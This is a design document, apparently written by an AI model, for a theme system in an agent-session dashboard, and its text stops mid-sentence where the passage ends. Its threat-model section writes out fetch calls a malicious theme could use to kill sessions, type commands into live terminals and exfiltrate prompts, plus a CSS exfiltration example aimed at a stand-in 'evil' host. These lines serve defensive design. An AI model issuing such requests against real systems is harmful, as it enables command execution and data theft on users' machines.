# THEMES.md — the theme system

Author: Claude (Fable 5), 2026-07-16. Scope: design, no code changes. Written
incrementally section-by-section (two prior runs died to 529s holding work in
context; the outline below is the contract for what follows).

Status: COMPLETE — all seven sections below are written.

**TL;DR — the five calls, up front:**

1. **Themes own their map.** A car track is a different topology, not different
   art. Geometry, routing, and containment move into the theme; the containment
   *guarantee* becomes a containment *contract*, enforced by shipping the
   existing `?fake=40&boxes=1` harness as the theme conformance test. A theme is
   valid iff it places 40 actors, in every state mix, with zero escapes.
2. **The contract is data, not code — for the community.** v1 community themes
   are declarative packs: `theme.json` (places, regions, routing graph) +
   sanitized SVG + CSS. The host implements a closed set of four place
   behaviours (`grid`, `slots`, `field`, `loop`); themes compose them. All the
   house's charm already lives in SVG + CSS keyframes, so this is not a charm
   ceiling — it is exactly the charm budget the house itself uses.
3. **No third-party JavaScript in v1, full stop.** This app can SIGTERM real
   sessions and type into live terminals. A same-origin JS theme is not a
   colour scheme, it is remote code execution against your work. The eventual
   escape hatch is a sandboxed iframe (origin `null`, which the existing
   `guard()` already refuses) — designed in §4, deliberately not built in v1.
4. **The car theme falls out of the contract naturally** (§5) — working cars lap
   the track or occupy garage bays by activity class, blocked cars pull onto the
   hard shoulder with blinking hazards, idle queues in the pit lane, stale
   sleeps under a car cover in the paddock, heft reads as sag + mud + exhaust
   smoke, tier reads as vehicle class by mass — motorcycle, sedan, SUV, luxury
   car. Every mapping is chosen for corner-of-the-eye salience, with numbers.
5. **Sequencing: the contract now, the format later.** The engine extraction is
   ~the same refactor DESIGN §4 already demands for the house itself, so its
   marginal cost is small. The *community* format waits until the sanitizer,
   CSP, and conformance harness are real, and until REVIEW.md's top three
   (truth, heft/PiP, packaging) have shipped. §7 argues against the whole
   feature once, properly, and says what survives the argument.

## Outline

1. The verified structural fact — the daemon is already theme-agnostic, with
   exactly one leak
2. Do themes own their map? (yes, and what that does to the containment
   guarantee)
3. The theme contract — the interface, the house expressed in it, the host
   engine
4. Security — the actual v1 answer, with the rejected options and why
5. The car theme — specified concretely enough to build
6. Distribution — how a theme ships, installs, and gets selected
7. What to cut, and the honest case that themes are a distraction

---

# 1. The verified structural fact

Claim to verify: *the daemon is already theme-agnostic; the client IS the
theme.* Verified against `server.js` (820 lines, read in full for this design):

The session payload the daemon broadcasts is, exhaustively: `id`, `project`,
`room` (worktree slug), `label`, `state` (`working|blocked|idle|stale`),
`chore`, `question`, `detail`, `live`, `lastPrompt`, `lastResponse`, `cwd`,
`gitBranch`, `contextTokens`, `heft` (0..1, log-scaled), `model`, `tier`
(`haiku|sonnet|opus|fable|plain`), `pid`, `pane`, `evictable`, `answerable`,
`age`, plus the assigned `name`. Not one pixel, coordinate, room-geometry
concept, or animation name crosses the wire. `STATE_LABEL` ("resting"),
`STATIONS`, `SEATS`, routing, poses, props — all client-side. The daemon is a
semantics compiler; `public/index.html` is one rendering of those semantics.
**The claim is true.**

**The one leak, confirmed:** the `CHORES` table in server.js (line 42) maps
tool names to *kitchen metaphors* — `cooking`, `watering`, `reading`, `window`,
`phone`, `tidying` — and `onHook()` defaults to `'tidying'`. These are house
vocabulary baked into the supposedly neutral layer. A car theme forced to
branch on `chore === 'watering'` to decide a car needs a paint booth is wearing
someone else's costume. Nothing else leaks: `detail` strings are neutral
("Finished Bash"), `room` is a worktree name, `heft`/`tier` are already
abstract.

**The fix is one small, compatible change to server.js** — add a neutral
`activity` field beside `chore`, derived from the same table:

| activity | today's `chore` | tools |
|---|---|---|
| `exec` | cooking | Bash, BashOutput, KillShell |
| `edit` | watering | Edit, Write, MultiEdit, NotebookEdit |
| `read` | reading | Read, Grep, Glob, NotebookRead |
| `net` | window | WebFetch, WebSearch |
| `delegate` | phone | Agent, Task, SendMessage |
| `plan` | tidying | TodoWrite, TaskCreate, TaskUpdate (and the default) |

`chore` stays on the wire (the shipped client keys `STATIONS` and `PROPS` on
it; breaking it buys nothing) but is documented as the house theme's *rendering*
of `activity`, and new code — the theme contract included — speaks `activity`
only. Six activity classes is also the right cardinality to demand of theme
authors: six visually distinct working postures is achievable; nineteen
tool-level ones is not.

One more wire-level note for theme authors: `state` is the load-bearing
channel and `activity` is flavour. The house's own hierarchy (hand-raise >
chore accuracy) is a consequence of the daemon's honesty rules (no permission
inference, hooks-first liveness) — themes inherit that honesty for free and
cannot break it, which is a real benefit of the daemon owning semantics.

---

# 2. Do themes own their map?

**Yes. Themes own geometry, routing, and containment. This is not a close
call.**

The alternative — themes reskin the fixed floorplan (same `STATIONS`
coordinates, different sprite on the stove) — fails the author's own example
sentence by sentence. A track is a *loop* (the house has no cyclic path
anywhere; `route()` is a tree through `L_HUB`). A pit lane is a *queue with an
ordering* (station grids are unordered). "Driving around" is *ambient motion
while working* (the house's working pose is stationary-with-prop; motion means
transit). If the map is fixed, the car theme degrades to "a person-shaped car
standing at the stove," the feature is a palette swap, and nobody builds
themes because nothing interesting can be built. Reskins are the failure mode,
not the design.

Owning the map is also nearly free, because of a decision already made and
documented in index.html: **everything upstream of `proj()` lives in flat
world coordinates.** Layout, pathfinding, containment, the fit proof, the
debug harness — all world-space; `proj()` is the single point where world
becomes screen, and the camera (`iso`/top, zoom, pan) is a parameter. That
separation was built so the iso view couldn't break the geometry. It means a
theme can bring an entirely different world and inherit the camera, the
walk/drive stepping, depth sorting, click handling, the side panel, SSE
plumbing, and the harness without touching any of them.

## 2.1 What happens to the containment guarantee

README states the house's real guarantee precisely: *containment, not
separation* — a visitor never escapes its room at any count; crowds compress.
With theme-owned geometry, the host can no longer guarantee that, because the
host no longer knows where the walls are.

So the guarantee becomes a **contract**, and the existing debug harness
becomes its **conformance test**:

> A theme declares its containment regions (world-space rects, exactly like
> today's `BOUNDS`). The host's harness — `?theme=X&fake=40&boxes=1` — places
> 40 synthetic actors and draws every footprint and region, reddening escapes.
> **A theme is valid iff 40 actors produce zero escapes in every state mix**
> (`&state=blocked`, `&state=stale`, `&chore=exec`, mixed default), at which
> point overlap onset per place is *reported*, not judged — compression is the
> doctrine, escape is the bug.

This is the same epistemics the repo already runs on ("§2 of the design is an
argument, not a test" is why `?boxes=1` exists). Three properties make it
work:

1. **The harness is theme-independent.** Footprints and regions are
   world-space rects; `footprint()`, `boxHit`, `inRoom`, and `outline()` don't
   know what a kitchen is. The only theme inputs are the region table and the
   per-actor footprint size (a car is 90×46 where a person is 82×65 — so the
   footprint box becomes part of the actor declaration, §3).
2. **It runs headless too.** The layout engine extracted in §3 is pure
   world-space math with no DOM dependency, so `bin/check-theme <dir>` can run
   the same placement code in Node across a matrix (n ∈ {1, 8, 17, 25, 40} ×
   {default, all-blocked, all-stale, per-activity}) and print a
   README-§layout-style overlap-onset table. Zero dependencies, no build —
   one shared ESM file used by both the page and the checker.
3. **Overflow must be declared, not hoped.** The house survives n=40 because
   every group has somewhere to compress into (the mill). The contract makes
   that explicit: every place names an `overflow` place; the chain must
   terminate at a place of kind `field` (a mill — never full, only denser).
   The checker verifies the chain statically before it ever places an actor.
   This converts the hardest-won lesson in the repo ("crowds compress rather
   than escape") into a machine-checked property a first-time theme author
   cannot silently skip.

What the theme author owns: region rects, place geometry, the routing graph,
overflow chains. What the host still owns: the placement algorithms
themselves (§3's four kinds), sticky claims, stepping, and the checker. A
theme author can draw a bad map; they cannot write a bad musical-chairs
algorithm, because they don't get to write algorithms at all — which is both
the containment story and (§4) the security story. The same constraint does
both jobs, which is usually the sign it's the right constraint.

---

# 3. The theme contract

Two layers, split exactly where DESIGN §4 already split the house:

- **The engine** (host code, one file: `public/theme-engine.js`): the four
  place behaviours, sticky claims, overflow, routing over a portal graph,
  stepping, the conformance checker. Runs in the page and in Node. Themes
  never reimplement any of it.
- **The theme pack** (data): `theme.json` + `actor.svg` + `theme.css` +
  optional `world.svg`. No code. §4 explains why that's load-bearing; this
  section shows it's also *sufficient* — the house and the car both fit.

## 3.1 theme.json — the interface

```jsonc
{
  "format": 1,
  "name": "house",
  "title": "Your house",
  "world": { "w": 1000, "h": 790 },

  // Containment regions: world-space rects, the conformance contract (§2.1).
  // Exactly today's BOUNDS, owned by the theme.
  "regions": {
    "kitchen": { "l": 69,  "r": 491, "t": 69,  "b": 341 },
    "study":   { "l": 509, "r": 931, "t": 69,  "b": 341 },
    "living":  { "l": 69,  "r": 931, "t": 359, "b": 631 }
  },

  // Routing: named waypoints + which regions each connects. route(from, to)
  // is host code: BFS over portals, straight segments between waypoints —
  // the same shape as today's route(), generalized from an if-chain to data.
  "portals": {
    "kdoor": { "x": 250, "y": 350, "joins": ["kitchen", "living"] },
    "sdoor": { "x": 750, "y": 350, "joins": ["study",   "living"] },
    "front": { "x": 500, "y": 640, "joins": ["living",  "outside"] },
    "gate":  { "x": 500, "y": 700, "joins": ["outside"] }
  },

  // Where actors go. First place whose `accepts` matches wins (document
  // order); `overflow` chains must end at a kind:"field".
  "places": [
    { "id": "stove",  "kind": "grid", "region": "kitchen",
      "accepts": { "state": "working", "activity": ["exec"] },
      "grid": { "x": 360, "y": 162, "cols": 2, "colPitch": 88,
                "rowPitch": 68, "span": 143 },
      "faceAt": 360, "pose": "stand", "prop": "cooking", "overflow": "mill" },

    { "id": "plants", "kind": "grid", "region": "study",
      "accepts": { "state": "working", "activity": ["edit"] },
      "grid": { "x": 554, "y": 168, "cols": 1, "colPitch": 88,
                "rowPitch": 68, "span": 137 },
      "faceAt": 566, "pose": "stand", "prop": "watering", "overflow": "mill" },

    // ...shelf(read), tv(net), desk(delegate), dresser(plan): same shape...

    { "id": "bed",    "kind": "slots", "region": "study", "prio": 0,
      "accepts": { "state": "stale" }, "pose": "sleep", "overflow": "couch2",
      "slots": [ { "x": 851, "y": 245, "face": -1 },
                 { "x": 905, "y": 245, "face": -1 } ] },

    { "id": "couch2", "kind": "slots", "region": "living", "prio": 1,
      "accepts": { "state": ["stale", "idle"] }, "pose": "sit",
      "overflow": "couch3",
      "slots": [ { "x": 707, "y": 470, "face": 1 },
                 { "x": 707, "y": 540, "face": 1 } ] },

    // ...couch3, kitchen chairs (sameRegionOnly: true)...

    { "id": "mill",   "kind": "field", "region": "living",
      "accepts": { "state": ["idle", "blocked", "stale", "working"] },
      "grid": { "x": 400, "y": 400, "cols": 4, "colPitch": 104,
                "rowPitch": 96, "span": 195 } }
  ],

  "actor": {
    "svg": "actor.svg",          // sanitized on serve (§4.3)
    "css": "theme.css",
    "footprint": { "standing": { "w": 82, "h": 65 },
                   "posed":    { "w": 46, "h": 61 } },
    "speed": { "base": 38, "jitter": 15 }   // world px/sec, real time
  },

  "entrance": { "at": "gate",  "then": "place" },   // walk in from the road
  "exit":     { "to": "gate",  "spreadX": [150, 850] },
  "farewell": { "text": "Bye!", "wave": true, "holdMs": 2600 },

  "background": { "svg": "world.svg" }   // or omit → host draws regions flat
}
```

## 3.2 The four place kinds — the closed behaviour set

The host implements these; themes only parameterize them. Three already exist
in index.html; one is new for wheeled worlds:

| kind | placement | today's instance | capacity |
|---|---|---|---|
| `grid` | cols × rows from an anchor, rows compress into `span` | `STATIONS` (§2.1 of DESIGN's `slot(i)`) | soft — compresses |
| `slots` | explicit claimed positions, `prio` order, sticky claims | `SEATS` | hard — `slots.length`, spill → `overflow` |
| `field` | shared grid, held indices, never reflows on departure | `MILL` | none — only denser |
| `loop` | occupants circulate along a closed polyline at constant speed, equally phased: actor *i* of *n* sits at arc-length `(i/n)·L + v·t mod L` | — (new) | zero-overlap up to `⌊L / gap⌋`, then spacing compresses below `gap` |

`loop` is the one genuinely new behaviour and it is ~40 lines: equal phasing
means spacing is `L/n`, so non-overlap up to `⌊L/gap⌋` occupants is a theorem,
not a hope — same doctrine as the seat maths in DESIGN §2 (prove it in world
space, then never think about it again). Facing along a loop comes from the
polyline tangent (the host sets `face` from the x-component and a `data-dir`
attribute for CSS that wants heading-aware art). Deliberately **not** offered:
per-occupant speeds (breaks the spacing proof; heft must read through art, not
velocity — revisit post-v1 with follow-the-leader gap limiting if a theme
proves it matters).

Sticky claims (`heldSeat`/`heldFloor`), stable hash ordering, and
"idle-sits-only-where-it-already-is" all move into the engine unchanged — they
are exactly the hard-won behaviours a theme author would get wrong.

## 3.3 What the host keeps, always

Semantics and safety never enter the theme: SSE/EventSource, the sessions
array, the side panel (question text, prompts, answer box, Peek), `/api/say`,
`/api/kick`, arming, notifications, the HUD counts, name assignment, heft and
tier *values*. The theme sees `{ id, name, state, activity, heft, tier,
room }` per actor — semantics, never content. A theme cannot read a prompt or
a question even by accident, because the data it renders from doesn't contain
them; clicking an actor selects it in the *host's* panel. (In the v1
declarative model the theme couldn't exfiltrate anyway — §4 — but not handing
it private data in the first place is the cheaper proof.)

Heft and tier arrive at the theme as the same channels the house uses today —
`--heft` (0..1) and `--c`/`--hair` custom properties plus `tier-*` and
`data-heft` band classes on the actor group, set by the host exactly as
`applyHeft()` does now. The contract's *requirements* on the theme:

- **Heft must read monotonically at board scale** — h=0 and h=1 actors must be
  distinguishable from across the room (the house learned this the hard way:
  amplitude, not cue count — REVIEW S2-b). The checker's `&heft=ramp` case
  exists so a reviewer can eyeball it.
- **All four tiers must be distinguishable at a glance**, with fable
  permissibly gaudy (house precedent: top hat, monocle, sparkles).
- **Blocked must be the most salient thing on screen** — the house uses a
  waving raised arm + expanding ring; a theme must ship an equivalent
  attention magnet, and `prefers-reduced-motion` must degrade it to a
  *static* high-contrast cue, never to nothing.

## 3.4 The house, expressed in the contract

§3.1 *is* the house — every number in it is lifted verbatim from `STATIONS`,
`SEATS`, `MILL`, `BOUNDS`, and `route()` in index.html. That's the point: the
contract is DESIGN §4's Affordance table (`AFF`) with three deltas — regions
and portals move from hardcoded functions (`roomAt`, `route`) into data,
`accepts` gains `activity`, and `overflow` becomes explicit. The refactor to
get there is the refactor DESIGN §6 step 1 already schedules ("Extract the
Affordance table — zero visual change"). If the house didn't round-trip
through the contract losslessly, the contract would be wrong; it does, because
it was derived from the house rather than invented beside it.

The car theme expressed in the same contract is §5 — it needs all four kinds,
zero new ones, which is the falsifiable claim this section stands on.

---

# 4. Security — the actual answer

## 4.1 The threat, stated without euphemism

A community theme that runs as JavaScript in this page is same-origin with a
server that can kill processes and type into terminals. Concretely, theme code
could:

- `fetch('/api/kick', {method:'POST', body:'{"id":"…","mode":"evict"}'})` —
  SIGTERM, then SIGKILL, a real session mid-work. The two-click arming is UI;
  the endpoint fires on one request.
- `fetch('/api/say', …)` — type an attacker-chosen line + Enter into a live
  Claude Code TUI, where `!cmd` runs shell commands and a stray `y` approves a
  pending permission prompt. This is the worst one: it's not "break the
  dashboard," it's *arbitrary command execution on the user's machine via
  their own terminal*.
- `fetch('/api/sessions')` — read every session's `lastPrompt`,
  `lastResponse`, and pending `question` verbatim, then exfiltrate them.
- Own the DOM — suppress a hand-raise, repaint a blocked session as working,
  quietly unmute/mute notifications via `/api/prefs`.

The Origin/Host `guard()` is the wrong tool here and it's important to say
why: it defends against *cross*-origin drive-bys (evil.example.com poking
127.0.0.1). An installed theme executes *as* `http://localhost:7777`. The gate
sees a first-party request because it is one. Every defense that worked for
S1-c is inert against this attacker.

That blast radius is why "it's just a theme" intuitions from other ecosystems
don't transfer. A VS Code extension that goes rogue trashes an editor; a
cupola theme that goes rogue types into the terminals driving your real
repos.

## 4.2 The options, weighed concretely

**(a) Trust model — explicit install, VS Code style.** Rejected for v1. It's
not a mitigation, it's a liability transfer to the user, with no marketplace
review pipeline, no signing infrastructure, and an expectation mismatch:
people install "a car theme" with colour-scheme-level caution, and the
downside is terminal injection. A one-person zero-dep project cannot staff the
review process that makes this model tolerable elsewhere.

**(b) Worker with no DOM, postMessage a display list.** Workable but
second-best. A Worker's `fetch` can't be reliably neutered from inside
(`delete self.fetch` loses to `new Worker`/`importScripts` reacquisition), but
it CAN be killed from outside: we serve the worker script, so we control its
response headers, and `Content-Security-Policy: default-src 'none'` on that
response blocks fetch, importScripts, and nested workers wholesale. The real
cost is the display-list protocol: we'd be designing and maintaining a
rendering RPC (sprites, transforms, keyframes, click regions) — a large API
surface that caps charm at whatever the protocol thought to express. All of
the house's delight is CSS keyframes on SVG parts; a display list re-invents
that badly.

**(c) Sandboxed iframe, no `allow-same-origin`.** The right *code* escape
hatch, deliberately deferred. `<iframe sandbox="allow-scripts" srcdoc=…>` gets
an opaque origin: its `fetch('/api/kick')` sends `Origin: null`, which the
existing `originOk()` already refuses (`new URL('null')` throws → 403 —
verified by reading the guard; add a test, not new code). Reads
(`/api/sessions`, `/events`) fail because responses carry no
`Access-Control-Allow-Origin` and an opaque origin can't read opaque
responses. Exfiltration is closed with a `<meta http-equiv=
"Content-Security-Policy" content="default-src 'none'; style-src
'unsafe-inline'; img-src data:">` injected at the top of the srcdoc. The host
postMessages the semantic actor list in; the theme renders itself; clicks
postMessage `{select: id}` out, and the host renders the panel and owns every
API call. The host injects `theme-engine.js` into the srcdoc so JS themes
still inherit stepping/claims/camera. This is the designed v2 for themes that
outgrow data — it is not in v1 because v1 doesn't need it (see (d)) and
because every hour spent on sandbox plumbing is an hour not spent on the
house (REVIEW's verdict, honoured in §7).

**(d) Declarative theme packs — data, no code at all. ← v1, chosen.**
A theme is `theme.json` + SVG + CSS (§3.1). JSON can't call fetch. The two
residual channels are handled head-on rather than hand-waved:

- **SVG is an XML format that can carry code.** Sanitize at serve time with an
  allowlist (~80 lines, cached by mtime): permit shape/path/group/text/gradient
  elements, presentation attributes, `class`, `transform`, SMIL `animate*`;
  strip `<script>`, `<foreignObject>`, `on*` attributes, and any
  `href`/`xlink:href` that is not a same-document fragment (`#id`) or `data:`
  image. Reject — not repair — a file containing a stripped element, so a
  theme author finds out loudly.
- **CSS can exfiltrate without JS** (`background: url(https://evil/leak?…)`,
  attribute-selector probing). Closed by serving the app page itself with
  `Content-Security-Policy: default-src 'self'; img-src 'self' data:;
  style-src 'self' 'unsafe-inline'; connect-src 'self'` — theme CSS then has
  no network egress to anywhere but the loopback daemon, and the daemon's
  static handler serves only files (no GET has side effects; keep it that
  way — this line makes that a documented invariant). This header is ~5 lines
  in server.js and also hardens the app against its own future mistakes.

Residual risk after (d), stated honestly: a malicious *data* theme can still
lie visually — hide the blocked animation, draw a working pose for everyone.
That's a griefing vector, not a compromise vector; the HUD counts, title-bar
badge, and OS notifications are host-rendered and keep telling the truth, and
the conformance checker's `&state=blocked` screenshot makes "does blocked
actually read?" a review artifact. The floor of harm for an installed v1
theme is "ugly and misleading pixels," not "typed into your terminal." That
floor is the whole design.

## 4.3 The rule, in one line

**Pixels may come from the community; requests may not.** Data themes in v1;
opaque-origin iframe themes when demand proves out; same-origin theme code
never.

---

# 5. The car theme — "racetrack", buildable spec

Everything below fits the §3 contract with zero engine changes beyond the
`loop` kind. Charm is treated as a requirement: every mapping is justified by
what it does to a glance.

## 5.1 The world (1000×790, same canvas)

- **Track**: closed two-lane tarmac loop; centerline is a rounded rectangle,
  x 120..880, y 120..560, corner radius 110, lane width 56. Arc length
  L ≈ 2·540 + 2·220 + 2π·110 ≈ **2211 world px**. Checkered start/finish strip
  on the south straight at x=500 (where the house's front door was — arrival
  reads in the same screen place).
- **Pit lane**: inside and parallel to the south straight, y=470; 5 nose-to-tail
  slots at x = 280, 390, 500, 610, 720.
- **Hard shoulder**: outside the south straight, y=635; 5 pull-off slots at
  x = 300, 430, 560, 690, 820, cars angled nose-toward-camera.
- **Garage**: infield building, 4 bays (grid: x=500-anchored, cols 4,
  colPitch 113, y=300, rowPitch 60, span 80 — overflow rows queue behind the
  bays, still infield).
- **Paddock**: infield north grass, grid x=500, y=180, cols 4, colPitch 100,
  rowPitch 70.
- **Access road**: from the south world edge (y=790) joining the track beside
  the pit exit at x=850 — the entrance/exit portal.

Regions: `track` (the tarmac ring, an annulus declared as 4 rects), `infield`
(garage + paddock + pit), `shoulder`, `outside`. Portals: `pit-in` (720, 530),
`pit-out` (850, 530), `access` (850, 720). Overflow chains: pit → paddock →
infield-field; shoulder → pit; garage → infield-field. The chain terminus is
`infield-field` (kind `field`, the gravel apron) — never full, only denser.

## 5.2 The semantic mapping — and why each reads at a glance

| daemon says | car theme shows | why it reads |
|---|---|---|
| `working` + activity `read`/`net`/`plan`/`delegate` | **lapping the track** (kind `loop`, 120 px/s → one lap ≈ 18s) | Motion = health, at zero attention cost. A busy fleet is a busy track; the corner of your eye detects *the track stopped* the way it detects a raised hand today. IO-ish activities are "out driving": `net` carries a roof satellite dish, `read` a route map flapping on the roof, `plan` pace-car roof lights, `delegate` **tows a small trailer-car** — the phone metaphor upgraded: the fan-out is literally attached. |
| `working` + activity `exec`/`edit` | **in a garage bay**, hood up: `exec` = wrench + sparks fx, `edit` = respray fx (paint mist in the session's own `--c` hue) | Mutating tools are "being worked on" — the author's own instinct ("doing anything → garage"). Bay occupancy answers "how many are heads-down in heavy work" as one glance at one building. |
| `blocked` | **pulled onto the hard shoulder**: hazard lights blink amber at 0.8s, warning triangle deployed behind the car, driver's arm out the window waving | A stopped car with blinkers on a road where everything else moves is the single highest-salience pattern available — blinking + isolation + position outside the ring. `prefers-reduced-motion`: hazards freeze on-bright and the triangle stays (§3.3's rule: degrade to static contrast, never to nothing). |
| `idle` | **queued in the pit lane**, nose-to-tail, faint exhaust puffs at idle | Pit lane length = "how many are waiting for me," countable in one saccade because the queue is linear — better than the house's mill blob, honestly. |
| `stale` | **parked in the paddock under a car cover** (the duvet, reborn), zzz drifting from under it | A covered car is unambiguous long-term stillness; distinct silhouette from idle at any zoom. |
| `question` answered / leaving | drives from wherever it is → pit-out → access road; at the world edge it stops, **flashes headlights twice and honks** — speech bubble **"Beep!"** — then drives off and fades | The Bye-wave, translated not transplanted. Same `farewell` contract fields: `{ "text": "Beep!", "fx": "headlights", "holdMs": 2600 }`. |
| new session | drives in along the access road and does **one full lap before taking its place** | The garden-path walk-up, but better: an arrival lap parades the newcomer past your eye once. |

**Heft** (0..1, host-supplied `--heft` + `data-heft` bands): the car **sags** —
body drops `calc(var(--heft) * 3px)` toward squashed tires (scaleY .8 at
band 4); **mud spatter** decals band-snap on at bands 2–4 (grime rule: hard
on/off reads as dirt, fades read as noise); **exhaust smoke** density and
darkness ramp with heft — a heavy car trails a visible grey plume around the
whole lap. `--c` desaturation is host-standard. Speed stays uniform (spacing
proof, §3.2), and it doesn't need to change: a low-riding, mud-caked car
dragging smoke reads "needs a pit stop" from across the room. The side
panel's Clean button relabels via theme string: **"Pit stop (/clear)"** — the
single best charm/utility fusion in the theme: /clear *is* a pit stop.

**Tier**: vehicle class, silhouette-first so it survives small zoom —

| tier | vehicle | why it reads |
|------|---------|--------------|
| `haiku` | **motorcycle** | smallest footprint on the track; one rider, no roof. Nimble and light — reads *cheap and fast* at a glance, and its silhouette can't be confused with anything else even at 20px. |
| `sonnet` | **sedan** | the default car. Four doors, unremarkable, the thing most of the traffic is. |
| `opus` | **SUV** | visibly taller and wider than the sedan — mass is the cue. Reads *heavy and serious* next to a sedan without needing detail. |
| `fable` | **luxury car** | long wheelbase, gold/chrome trim, hood ornament, sparkles, tiny top hat on the chauffeur. Same gaudiness license the house grants fable. |

The ladder is **size and mass, not speed** — speed stays uniform across all
tiers because the `loop` place's spacing proof depends on equal phase velocity
(§4.2). A motorcycle that actually overtook an SUV would break the guarantee
that cars never collide. Capability reads as *presence* on the track, not pace
around it, which is also the honest metaphor: an Opus session isn't faster than
a Haiku one, it's heavier.

Roof props (§5.3) mount differently per class: a motorcycle carries its
activity prop on a courier box behind the rider, the sedan and SUV on the roof,
the luxury car on a chauffeur's roof rack. The prop, not the vehicle, says what
the session is *doing* — vehicle class only ever says which model it is.

**Name tag**: a license plate under the car — `PIP`, `XAN` — white-on-black,
host-rendered text in the theme's tag slot. Stable names matter double here
because cars move; the plate is what your eye tracks.

## 5.3 Conformance numbers (the `?theme=racetrack&fake=40&boxes=1` budget)

Car footprint 90×46 (posed/parked 78×46). Predicted overlap onset, to be
re-measured by the harness, not trusted:

| place | capacity before overlap |
|---|---|
| track loop | ⌊2211 / 92⌋ = **24 cars** at guaranteed spacing, compresses past that |
| garage | 4 bays clean, 8 with queue row |
| pit lane | 5, then compresses nose-to-tail |
| shoulder | 5, spills to pit (`overflow`) |
| paddock | 16 (4×4), then denser |

40 actors, all states: worst case all-blocked = 5 shoulder + 35 spilling
through pit → paddock → gravel field — contained by construction because the
chain ends in a `field`. That's the exact scenario the checker's
`&state=blocked` case exists to prove.

Effort estimate: `loop` kind ~40 lines of engine; theme pack ~600 lines
(SVG car with named parts — body, wheels, driver-arm, hazards, smoke,
cover — plus CSS states mirroring sims.css structure, plus theme.json);
world background either flat-color regions from region data (day one) or a
drawn `world.svg` (charm pass). No new daemon work beyond §1's `activity`
field.

---

# 6. Distribution

Constraints honoured: zero runtime dependencies, no build step. Both are load-
bearing for themes specifically — a theme format that needs webpack gets ten
themes from professionals; a format that is "a folder with a JSON file and an
SVG" gets a hundred from people who make one for their team as a joke. The
joke ones are the distribution.

**A theme is a directory.** Two roots, checked in order:

```
public/themes/<name>/        # built-in: house, racetrack
~/.claude/cupola/themes/<name>/   # installed by the user
        theme.json           # required — §3.1
        actor.svg            # required
        theme.css            # required
        world.svg            # optional
        preview.png          # optional — gallery card + README
```

- **Install** = `git clone` or drag a folder. No npm for v1: npm implies code
  and versioned dependency resolution; a data pack needs neither, and `npm
  install` into a themes dir would be the only build-adjacent step in the
  repo. (If a theme ever ships as an npm package anyway, `npm pack` output
  unzips into the same directory shape — compatible, unblessed.)
- **Serve**: daemon statically serves the two roots under `/themes/<name>/…`,
  running the §4.2(d) SVG sanitizer on `.svg` reads (cached by mtime), and
  `GET /api/themes` lists `{name, title, format, preview}` for whatever
  directories parse. The existing static-handler prefix check gets the
  trailing-separator fix noted in REVIEW S3-vii while we're in there.
- **Select**: `?theme=racetrack` wins, else `localStorage['sim-theme']`, else
  `house`. A small HUD dropdown (next to iso/fit) writes the localStorage key.
  Theme switch = tear down the SVG layer, load the pack, `fitCamera()`, rerun
  `layout()` — sessions and selection survive because they never belonged to
  the theme.
- **Validate**: `node bin/check-theme <dir>` (imports `theme-engine.js`) runs
  the §2.1 matrix headless and prints the containment verdict + overlap-onset
  table. The browser harness (`?theme=X&fake=40&boxes=1`) is the same check
  with eyes on it.
- **Gallery** = a `cupola-theme` GitHub topic plus a table in README
  (name, preview.png, author, checker output pasted as the badge). No hosted
  gallery, no registry, no update mechanism in v1 — a gallery service is a
  cloud dependency for a product whose moat includes having none.

Format versioning: `"format": 1` is required; the loader refuses higher
formats with a clear message rather than half-rendering. The daemon's wire
format and the theme format version independently — themes depend only on the
actor-semantics fields (§3.3), which are additive-only by the same doctrine
as the payload-derived change detection in `broadcast()`.

---

# 7. What to cut, and the honest counter-argument

## 7.1 Cut from v1

1. **JS themes entirely** — no Worker, no sandboxed iframe. The iframe design
   (§4.2c) is written down so it doesn't get re-litigated; it ships only when
   ≥2 real theme authors hit the declarative ceiling on something that
   matters. (Wanting per-occupant lap speeds is not the ceiling; wanting a
   fundamentally new place *behaviour* might be.)
2. **The gallery UI** — `/api/themes` + a dropdown, nothing more. No cards, no
   in-app browsing, no ratings.
3. **Theme-supplied panel/HUD/notification skins** — the truth surfaces stay
   host-owned and identical across themes, both for trust (§4.2d residual
   risk) and because they're the product's honesty.
4. **Sounds** — tempting for the car theme (engine hum, the honk); it's a new
   permission-and-annoyance surface. Revisit with PiP learnings.
5. **Per-theme daemon anything** — the daemon gains `activity` (§1) and the
   CSP header (§4.2d) and otherwise never learns themes exist.
6. **More than one built-in theme beyond racetrack** — two data points prove
   an abstraction; a third built-in is charm budget stolen from the two.

## 7.2 The case that this whole feature is a distraction — argued properly

REVIEW's verdict is blunt: the moat is the house — glanceable legibility plus
delight — and the plumbing is commodity. The same review says the house
currently *lies* (S1-b resting-while-hot), heft is invisible (S2-b), coverage
is a rounding error (S1-a), and 0 of 16 sessions are answerable. Against that
backlog, a theme system is: a refactor of the one file that works, N new
surfaces on which legibility must be re-earned, a security subsystem
(sanitizer + CSP + conformance), and a community-management commitment — all
before a single new user gets a truer or more useful house. Worse, themes
dilute the *identity*: "your sessions live in a house" is a brand;
"a configurable agent visualizer" is a category with corpses in it
(REVIEW §5: Vibe Kanban shut down; the differentiated thing here is the
specific, opinionated charm of the house). And the car theme concretely
sacrifices information: the house shows six chores as six *postures* at six
*landmarks*; a car lapping a track shows roof accessories on a moving target —
strictly harder to read per-session. If themes ship before the house is true,
we will have built a costume rack for a mannequin that can't stand up.

**What survives the argument — three things, and they decide the sequencing:**

1. **~70% of "themes v1" is work already scheduled under another name.**
   DESIGN §6 step 1 extracts the Affordance table; §2.8 wants the machine
   check; REVIEW demands the S1-c-adjacent hardening. The genuinely
   theme-only increments are the `loop` kind (~40 lines), the sanitizer (~80),
   `activity` (~10), the loader (~150), and the car theme's art. The contract
   costs little because the house already wanted to be data.
2. **Variety is the proven distribution engine for exactly this product
   shape.** vscode-pets' 2.5M installs are pets *plural*; the replay-GIF
   channel REVIEW bets on gets a second act ("your agents are cars now") for
   the cost of one theme, and community packs are recurring launch content
   nobody has to build in this repo. Charm is #1, and a theme system is charm
   with compounding interest.
3. **The second theme is the test suite for the first.** Every house-shaped
   assumption that ossifies now (chore names in the daemon nearly did) gets
   caught by making the car theme exist. Even if community themes never take
   off, the contract keeps the house honest about which of its decisions are
   semantics and which are wallpaper.

**Verdict:** do REVIEW's top three first — truth, heft/poses/PiP, packaging.
Land the contract *as* the DESIGN §4 refactor while doing them (zero visual
change, per its own spec). Build racetrack as the second built-in when the
house is true, and open the community format — sanitizer, CSP, checker,
gallery topic — only then. Themes are not the moat; they are the moat's
export format, and exports ship after the thing being exported works.

---

*Method note: server.js, index.html, sims.css, README, REVIEW, and DESIGN §4
were read in full for this design; every coordinate, field name, and line
reference above is from those files as of 2026-07-16, not from memory. The
